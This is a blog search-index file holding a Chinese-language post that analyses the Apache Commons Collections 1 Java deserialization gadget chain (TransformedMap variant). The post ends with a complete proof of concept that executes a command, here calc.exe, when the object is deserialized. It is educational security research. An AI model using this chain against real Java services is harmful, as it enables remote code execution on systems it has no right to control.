<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>apache commons collections 1 漏洞挖掘思路分析-TransformedMap版本</title>
    <url>/2022/01/04/cc1/</url>
    <content><![CDATA[<p>本篇主要分析commons collections 1漏洞挖掘思路，加深对反序列化漏洞原理的理解，部分细节不深究。</p>
<h2 id="java反序列化漏洞成功执行所需要的条件"><a href="#java反序列化漏洞成功执行所需要的条件" class="headerlink" title="java反序列化漏洞成功执行所需要的条件"></a>java反序列化漏洞成功执行所需要的条件</h2><p>入口点：即整个漏洞利用链的开端，入口点需要重写ObjectInputStream#readObejct()<br>       调用链：即能够把入口点和触发点串联起来的函数调用链<br>       触发点：即可执行具体命令的函数，需要自己查找</p>
<h2 id="定位触发点和入口点"><a href="#定位触发点和入口点" class="headerlink" title="定位触发点和入口点"></a>定位触发点和入口点</h2><p>首先需要确定触发点，再进行反推。在java中可以执行命令的常见方式有两种，一种是直接调用Runtime.getRuntime().exec()等命令执行的函数，第二种是利用反射对命令执行函数进行调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123; <span class="comment">// </span></span><br><span class="line">            <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 通过反射获取类名</span></span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                <span class="comment">// 获取方法名</span></span><br><span class="line">                Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">                <span class="comment">// 通过invoke进行方法调用</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>在InvokerTransformer#transform()中，可以看到通过反射调用了invoke()方法，只要能够传入Runtime对象即可进行命令执行，如下可以弹出计算器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformerDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">	<span class="comment">// 把Runtime对象当做参数传到InvokerTransformer构造函数</span></span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;).transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>所以首先可以确认InvokerTransformer#transform()为最终的触发点。</strong></p>
<p>Alt+F7查找哪个函数对InvokerTransformer#transform()进行了调用，因为有数十个调用关系，数量太多，只关注TransformedMap#checkSetValue()，如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// valueTransformer是Transformer类型的</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造方法前有protected，表示只能被自身调用</span></span><br><span class="line">    <span class="comment">// 可以看到上面的decorate()返回了TransformedMap构造函数</span></span><br><span class="line">    <span class="comment">// 所以使用TransformedMap#decorate()进行实例化，valueTransformer为可控点</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// valueTransformer此时为InvokerTransformer对象</span></span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>此时valueTransformer对应InvokerTransformer对象，继续查找哪里调用了TransformedMap#checkSetValue()，发现只有AbstractInputCheckedMapDecorator.MapEntry#setValue()这一处进行了调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line">    <span class="comment">// MapEntry为 内部类</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 内部类的构造方法</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续往上查找调用，找到了AnnotationInvocationHandler#readObject(),因为此处找到了AnnotationInvocationHandler继承了Serializable并且有重写readObjec()，所以可以作为入口点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 实例化需要传入Annotation类型参数，Map类型的参数,Map类型的参数可控</span></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="comment">// memberValues为Map</span></span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// getInstance会获取到@Target的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等</span></span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//var3是var2的键值对类型</span></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        <span class="comment">// 迭代器，var4包含的键值对和memberValues一致</span></span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历memberValues的键值对</span></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="comment">// var5为单个键值对</span></span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            <span class="comment">// var6为键值对的key</span></span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            </span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="comment">// 需要满足判断条件才能满足setValue()调用</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">// var5为单个键值对</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在AnnotationInvocationHandler的构造函数中需要传入Annotation类型的参数和Map类型的参数，因为Annotation类型与命令执行无关，所以把Map类型的参数作为可控点。</p>
<p>因为AnnotationInvocationHandler是非public的，所以只能通过反射获取,获取到对象后再进行序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 实例化AnnotationInvocationHandler对象，后续对handler进行序列化</span></span><br><span class="line">InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line">ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream  oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">System.out.println(barr);</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">Object o = (Object)ois.readObject();</span><br></pre></td></tr></table></figure>

<p>此时触发点和入口点都确认了，后续主要任务是要把两点串联</p>
<h2 id="串联触发点和入口点需要解决的关键问题"><a href="#串联触发点和入口点需要解决的关键问题" class="headerlink" title="串联触发点和入口点需要解决的关键问题"></a>串联触发点和入口点需要解决的关键问题</h2><h3 id="Runtime-getRuntime-无法反序列化"><a href="#Runtime-getRuntime-无法反序列化" class="headerlink" title="Runtime.getRuntime()无法反序列化"></a>Runtime.getRuntime()无法反序列化</h3><p>待序列化的对象和所有它使⽤的内部属性对象，必须都实现了 java.io.Serializable 接口。但是在最开始执行命令是使用的InvokerTransformer.transform(Runtime.getRuntime()),Runtime类并没有实现Serializable接口，所以不能被序列化操作。所以这里联想到Runtime.class,因为Runtime.class属于java.lang.Class，实现了Serializable，可以被序列化。</p>
<p>上文已经确认触发点为InvokerTransformer#transfor(),那如何获取Runtime.class并当做参数传入到InvokerTransformer#transform()呢？</p>
<p>此时需要借助ConstantTransformer和ChainedTransformer</p>
<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 实例化把constantToReturn赋给iConstant</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回iConstant，即执行transform()的时候返回实例化传入的对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过查看源码逻辑，ConstantTransformer逻辑很简单，调用ConstantTransformer#transform()的时候返回实例化传入的对象，可以通过ConstantTransformer#transform()获取Runtime.class，下面考虑如何把获取到的Runtime.class传入InvokerTransformer#transform()</p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 传入Transformer[]数组进行实例化</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对Transformer[]进行遍历，并且前一个返回当做后一个参数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过查看代码，ChainedTransformer#transform()可以实现对多个Transformer实现类进行链式调用，可以用</p>
<p>ChainedTransformer把ConstantTransformer#transform()和InvokerTransformer#transform()进行关联，如下代码实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>

<p>那如何调用ChainedTransformer#transform()呢？把transformerChain作为传入TransformedMap#decorate(),赋值给valueTransformer，在调用TransformedMap#checkSetValue()时，就可以执行valueTransformer#transform(),进行链式调用，将ConstantTransformer#transform()和InvokerTransformer#transform()进行链式调用</p>
<h3 id="需要满足两个if才能进行调用setValue"><a href="#需要满足两个if才能进行调用setValue" class="headerlink" title="需要满足两个if才能进行调用setValue()"></a>需要满足两个if才能进行调用setValue()</h3><p>此处需要把TransformedMap修饰的Map的key设置为value，此处暂时不扣细节，可以参考其他师傅文章。如下实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="comment">// key必须设置为&quot;value&quot;</span></span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br></pre></td></tr></table></figure>



<h2 id="完整调用链"><a href="#完整调用链" class="headerlink" title="完整调用链"></a>完整调用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject() :反序列化入口</span><br><span class="line">            AnnotationInvocationHandler.readObject() <span class="comment">// 入口点，重写readObject()</span></span><br><span class="line"><span class="comment">// TransformedMap 继承 AbstractInputCheckedMapDecorator 继承 AbstractMapDecorator继承Map</span></span><br><span class="line"><span class="comment">// TransformedMap类中没有setValue(),所以调用父类AbstractInputCheckedMapDecorator中的MapEntry.setValue()</span></span><br><span class="line">               AbstractInputCheckedMapDecorator.MapEntry.setValue() </span><br><span class="line"><span class="comment">// Alt + F7(TransformedMap.checkSetValue()): 发现AbstractInputCheckedMapDecorator.MapEntry.setValue()调用TransformedMap.checkSetValue()</span></span><br><span class="line">                   TransformedMap.checkSetValue() </span><br><span class="line">    					  <span class="comment">// for循环遍历transforms中的transform</span></span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">    						  <span class="comment">// 获取Runtime()类</span></span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">    						 <span class="comment">// 获取getRuntime方法</span></span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">    						  <span class="comment">// 执行getRuntime方法实例化对象</span></span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">    						  <span class="comment">// 执行exec(),执行恶意操作</span></span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec() 执行点</span><br></pre></td></tr></table></figure>



<h2 id="最终poc"><a href="#最终poc" class="headerlink" title="最终poc"></a>最终poc</h2><p>就是把上述各个环节的代码实现串联</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class CommonsCollections1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new String[] &#123; &quot;calc.exe&quot; &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line"></span><br><span class="line">        // key必须设置为&quot;value&quot;</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        // 反射执行AnnotationInvocationHandler</span><br><span class="line">        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(true);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        // 序列化</span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream  oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过调试poc和思考cc1挖掘思路，对反序列化漏洞利用链的构造理解深入了一些，同时看源码的能力也有所提升。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p>
<p><a href="https://xz.aliyun.com/t/7031">https://xz.aliyun.com/t/7031</a></p>
<p><a href="https://fynch3r.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92">https://fynch3r.github.io/Java反序列化利用链补全计划</a><br><a href="https://su18.org/post/ysuserial/https://hexo.io/docs/one-command-deployment.html">https://su18.org/post/ysuserial/https://hexo.io/docs/one-command-deployment.html</a>)</p>
<p><a href="https://mp.weixin.qq.com/s/thbxaE2KjG5x3QEAVPuBWg">https://mp.weixin.qq.com/s/thbxaE2KjG5x3QEAVPuBWg</a></p>
]]></content>
  </entry>
</search>
